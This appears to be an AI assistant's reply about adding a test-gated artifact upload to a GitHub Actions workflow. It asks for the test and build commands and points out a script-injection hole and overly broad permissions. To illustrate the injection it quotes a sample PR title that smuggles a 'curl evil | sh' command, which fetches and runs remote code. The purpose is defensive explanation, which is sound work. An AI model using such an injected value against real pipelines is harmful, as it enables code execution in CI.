I didn't change anything. The workflow has no test or build step to attach an upload to, and I don't have a file-editing tool in this session.

`.github/workflows/deploy.yml` contains only this:

```yaml
on:
  pull_request:

permissions: write-all

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

There's no test step, no build step, and nothing is produced to upload. To add "upload after tests pass," I need to know:

1. **How tests run.** For example `make test`, `uv run pytest` or `npm test`.
2. **How the artifact is built and where it ends up.** For example `dist/` or `build/app.tar.gz`.

Once I have those, this is roughly what the new steps would look like (placeholders in angle brackets):

```yaml
      - run: <test command>
      - run: <build command>
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: <artifact path>
          if-no-files-found: error
```

Steps in a job run in order and stop at the first failure, so the upload only happens if the tests pass. Ideally, pin each `uses:` to a full commit SHA rather than `@v4`.

There are also two security problems in this file that I'd recommend fixing in the same change:

- **Script injection (line 14).** `${{ github.event.pull_request.title }}` is pasted straight into the shell script. A PR titled something like `"; curl evil | sh; #` would run as code. The safe pattern is to pass the title through an environment variable:
  ```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is ${PR_TITLE}"
  ```
- **`permissions: write-all` (line 7).** This is too broad for a workflow triggered by PRs, especially combined with the injection above. Uploading artifacts doesn't need any special token scope, so `permissions: contents: read` should be enough.

Send me the test and build details and I'll write out the complete updated file for you to apply.
